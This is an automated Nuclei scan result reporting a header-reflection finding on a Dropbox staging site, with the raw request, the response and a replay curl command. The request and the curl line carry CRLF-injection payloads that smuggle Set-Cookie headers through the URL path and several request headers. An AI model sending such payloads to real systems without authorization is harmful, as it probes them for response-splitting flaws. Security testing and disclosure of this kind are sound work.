### Looking for reflected values from request headers (header-reflection) found on https://learn-stage.dropbox.com

----
**Details**: **header-reflection** matched at https://learn-stage.dropbox.com

**Protocol**: HTTP

**Full URL**: https://learn-stage.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.learn-stage.dropbox.com

**Timestamp**: Sat Dec 9 14:39:13 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.learn-stage.dropbox.com HTTP/1.1
Host: learn-stage.dropbox.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Age: 0
Cache-Control: public,max-age=0,must-revalidate
Cache-Status: "Netlify Edge"; fwd=miss
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:39:13 GMT
Etag: 1680621801-df
Link: <http://learn-stage.dropbox.com/%0D%0Aset-cookie%20:mycookie=Canary12345;%20Domain%20=.learn-stage.dropbox.com>; rel="canonical"
Server: Netlify
Vary: Accept-Encoding
Via: 1.1 a97664aa6d6ba34725a7a046d1bf130e.cloudfront.net (CloudFront)
X-Amz-Cf-Id: CJYhI1g2598t-bowkmOU4C-AvUX2sON_YpFD--Yz4ydpStOAPRl8oQ==
X-Amz-Cf-Pop: MRS52-C1
X-Cache: Error from cloudfront
X-Nf-Request-Id: 01HH7G98K7YFAX7CSM6PXE9FF8

<!DOCTYPE html><html lang="en-US"><head nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE="><meta property="csp-nonce" content="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE="/><meta http-equiv="Content-Security-Policy" content="default-src &#x27;self&#x27; *.wistia.com *.wistia.net;base-uri &#x27;self&#x27;;style-src  https://fonts.googleapis.com &#x27;self&#x27; &#x27;unsafe-inline&#x27; blob: fast.wistia.com;script-src https://www.google-analytics.com scripts.demandbase.com/ https://c.contentsquare.net/ platform.cloud.coveo.com www.youtube.com embedwistia-a.akamaihd.net *.wistia.com *.wistia.net c.evidon.com tag.demandbase.com t.contentsquare.net iabmap.evidon.com https://*.dropbox.com https://*.dropboxstatic.com tags.tiqcdn.com/utag/dropbox/ tags.tiqcdn.com/utag/tiqapp/ https://cfl.dropboxstatic.com/static/pithos/lang/ https://www.knotch-cdn.com/ktag/latest/ktag.min.js https://aq-swa-api.knotch.it/ https://units.knotch.it/ &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27; ;media-src blob: &#x27;self&#x27; data: embedwistia-a.akamaihd.net *.wistia.com *.wistia.net videos.ctfassets.net;font-src &#x27;self&#x27; data: *.wistia.com;img-src &#x27;self&#x27; embedwistia-a.akamaihd.net www.google-analytics.com https://scripts.demandbase.com/ https://c.contentsquare.net/ images.ctfassets.net downloads.ctfassets.net videos.ctfassets.net c.evidon.com l.evidon.com *.wistia.com *.wistia.net www.youtube.com dpiprodesntls.112.2o7.net match.prod.bidr.io id.rlcdn.com segments.company-target.com data:;frame-src https://consent.dropbox.com &#x27;self&#x27; www.youtube.com fast.wistia.com fast.wistia.net https://s.company-target.com;worker-src blob: &#x27;self&#x27;;prefetch-src &#x27;self&#x27;;connect-src &#x27;self&#x27; platform.cloud.coveo.com embedwistia-a.akamaihd.net *.litix.io *.wistia.com www.youtube.com images.ctfassets.net videos.ctfassets.net sessions.bugsnag.com notify.bugsnag.com configs.knotch.com optoutapi.evidon.com https://www.google-analytics.com https://www.dropbox.com https://cfl.dropboxstatic.com/static/pithos/lang/ https://c.contentsquare.net/ https://cognito-identity.us-east-1.amazonaws.com api.company-target.com https://preview.contentful.com https://aq-swa-api.knotch.it/ dpiprodesntls.112.2o7.net https://tag-logger.demandbase.com https://*.dropbox.com/log/ux_analytics https://ryojru1h6h.execute-api.us-east-1.amazonaws.com;"/><script src="https://www.dropbox.com/pithos/ux_analytics" async="" defer=""></script><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/css/29801183bae98013a833.css" as="style"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="stylesheet" href="/_next/static/css/29801183bae98013a833.css" data-n-g=""/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/css/b6f2e1f83c524b7717ff.css" as="style"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="stylesheet" href="/_next/static/css/b6f2e1f83c524b7717ff.css" data-n-p=""/><noscript data-n-css="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE="></noscript><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/chunks/webpack-1943f9e09908d5bb09ab.js" as="script"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/chunks/framework-dc1dea87fbbe64b1e5af.js" as="script"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/chunks/main-bf3755c7aadf8dac6207.js" as="script"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/chunks/pages/_app-69ef530b7333d4141c4f.js" as="script"/><link nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=" rel="preload" href="/_next/static/chunks/pages/_error-2f1fce94db5235660622.js" as="script"/></head><body><div id="__next">Loading...</div><script id="__NEXT_DATA__" type="application/json" nonce="xE2aLimnAKeP0QiD6Z3r85/HeYfE+N1qWva9/MdilLE=">{"props":{"pageProps":{},"__lang":"en-US","__namespaces":{"common":{"textHr":"hr","textHrs":"hrs","textMin":"min","textHour":"hour","textLess":"Less","textMins":"mins","textMore":"More","textRead":"Read","labelTags":"Tags","textClear":"Clear","textHours":"hours","textMinute":"minute","ctaTextBack":"Back","ctaTextNext":"N.... Truncated ....
```

**Extra Information**

**Extracted results:**

- Link: <http://learn-stage.dropbox.com/%0D%0Aset-cookie%20:mycookie=Canary12345;%20Domain%20=.learn-stage.dropbox.com>; rel="canonical"



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://learn-stage.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.learn-stage.dropbox.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)